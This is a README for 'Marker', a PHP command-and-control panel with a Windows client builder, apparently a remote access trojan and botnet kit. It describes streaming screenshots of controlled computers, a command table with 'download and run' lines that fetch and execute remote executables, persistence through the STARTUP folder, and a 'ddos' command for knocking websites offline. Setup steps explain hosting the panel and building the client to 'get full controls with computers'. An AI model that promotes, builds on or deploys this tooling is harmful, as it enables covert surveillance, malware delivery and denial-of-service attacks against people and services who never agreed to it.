### Marker

# Features
- [x] Streaming desktop screenshot with request.
- [x] Supporting `4` commandline `download` + `download and run` + `ddos` + `msgbox` .
- [x] Supporting `offline` computers `Refresh every 19 secounds` .
- [x] Black List - manager page , `Delete IP` + `Remove All` .
- [x] Encrypt `Strong` key bettwen ` Server & Client ` to make it simply harder to decoded.
- [x] Full safe scan to script ` check if is that an admin is logged in ? ` or not and disconnect !
- [x] Safe script from ` flood ` by check the computers file is exists or not !
- [x] Safe script from ` wcp ` by blcok the computers IP ADDRESS in configs file - delete all computers file from hosting .


# Sample Usage
1. Upload all files in your hosting ` you can use xampp ` but check the ` 80 ` port is open in your router .
2. 'Requirements' : open file in ` /api/config.php ` and change ` Username + Password ` with your information .
```php
$username = 'test'; # Admin username
$password = 'test'; # Admin Password
```
3. open path ` /api/builder.rar ` and uncompress it in your desktop and run ` Marker Builder v1 - KingDomSc.exe ` to create a server .
4. logged in web-script , and get full controls with computers .


# Project Commands
Command | Example | Description
--- | --- | ---
*download* | download(http://example/file.exe) | download file in `STARTUP` path
*downloadrun* | downloadrun(http://example/file.exe) | download file in `TEMP` path and running it
*ddos* | ddos(http//website.com/example) | To make online service unavailable
*msgbox* | msgbox(body,title) | To show messagebox with body and up title in computers .
<dl>
<dt>You can add more commands : </dt>
<dd>by edit file in ` /api/command.php ` + edit server `commandline` panel.</dd>
</dl>


# Screenshots
![alt text](http://up.dev-point.com/uploads1/d57d37f8f83a1.png "Login page")
![alt text](http://up.dev-point.com/uploads1/2164da4760961.png "Offline computers")
![alt text](http://up.dev-point.com/uploads1/4ed82b3d87663.png "Online computers")
![alt text](http://up.dev-point.com/uploads1/b2f1abd4e9ff2.png "No computers connect")
1. ` Login page `
2. ` Offline computers `
3. ` Online computers `
4. ` No computers connect `

![alt text](http://up.dev-point.com/uploads1/8cf54aa9a1594.png "Desktop screenshot")
1. ` Desktop Screenshot - online Streaming ` with ' Jquery Script '.

![alt text](http://up.dev-point.com/uploads1/e1c57572f6286.png "Setting page")
1. ` Setting page - Change username and password information ` .

![alt text](http://up.dev-point.com/uploads1/362bfaa40f152.png "Blacklist page")
1. ` Controls with blacklist IP ADDRESS ` with ` Remove once ` or ` Remove all `

![alt text](http://up.dev-point.com/uploads1/524105adef377.png "Builder app")
1. ` Builder Server Application - Windows Only `.


# Youtube Tutorial
[![IMAGE ALT TEXT HERE](https://i.ytimg.com/vi/ZHZsnNR2Zc4/hqdefault.jpg)](https://www.youtube.com/watch?v=ZHZsnNR2Zc4)
1. Special thanks to `Hallaj.Hack` - make this tutorial .


# Support the project
<a href="https://www.instagram.com/kingdomsc" target="_blank">Kingdomsc - Instagram Accounts</a>
